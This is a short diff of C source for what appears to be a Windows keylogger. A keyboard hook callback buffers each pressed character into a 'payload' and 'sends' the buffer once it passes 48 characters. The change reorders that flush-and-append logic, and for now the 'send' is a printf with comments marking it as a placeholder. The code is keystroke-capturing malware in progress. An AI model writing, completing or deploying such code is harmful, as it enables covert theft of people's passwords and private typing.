@@ -53,17 +53,18 @@ LRESULT CALLBACK stuff(int nCode, WPARAM wParam, LPARAM lParam)
 		
 		size_t payloadSize = strlen(payload);
 		
-		if((payloadSize + strlen(charAppend)) < 50){
+		if(payloadSize > 48){
+			//send the payload
+			printf("%s\n", payload);
+			memset(payload, '\0', sizeof(payload));
+
+		}else if((payloadSize + strlen(charAppend)) < 50){
 			strcat(payload, charAppend);
 			memset(charAppend, '\0', sizeof(charAppend));
 			//WAIT, IF IT DOESNT HAVE SPACE IT JUST IGNORES THE BUFFER!?!! WE MIGTH NEED SWITCH CASE FOR THIS
 
 			//figure out how to append strings, maybe for loops based off of lens of added chars and strings
 			//add char or string until done with payload.
-		}else if(payloadSize > 48){
-			//send the payload
-			printf("%s\n", payload);
-			memset(payload, '\0', sizeof(payload));
 		}
 
 		//printf("Key was pressed!\n");
